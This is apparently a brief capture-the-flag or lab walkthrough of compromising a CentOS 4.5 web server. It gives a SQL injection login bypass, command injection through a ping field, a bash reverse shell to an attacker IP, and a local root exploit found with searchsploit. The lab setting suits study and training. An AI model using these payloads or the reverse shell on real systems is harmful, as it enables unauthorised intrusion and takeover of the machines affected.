We ran a netdiscover and we got an IP 

Now we run an nmap scan 

Not shown: 993 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?

Lets try to exploit the port 80 

We got a login page asking for username and password 

So we try a admin'or'1'='1 sql injection 

Success !!!!

We got the administrative panel . 
It has a ping functionality 

We can ping on any ip 


So we try command injection 

google.com ; ls 

It works 

google.com; bash -i >& /dev/tcp/192.168.57.203/9889 0>&1

We get a reverse shell

On doing lsb_release -a , 
we find the os to be Cent OS 4.5

We search for CentOs 4.5 in searchsploit and get two exploits 

One of them failed . 

The other ran and we see the console opening in root 

We got Root !!!!!!!!!!!!!!
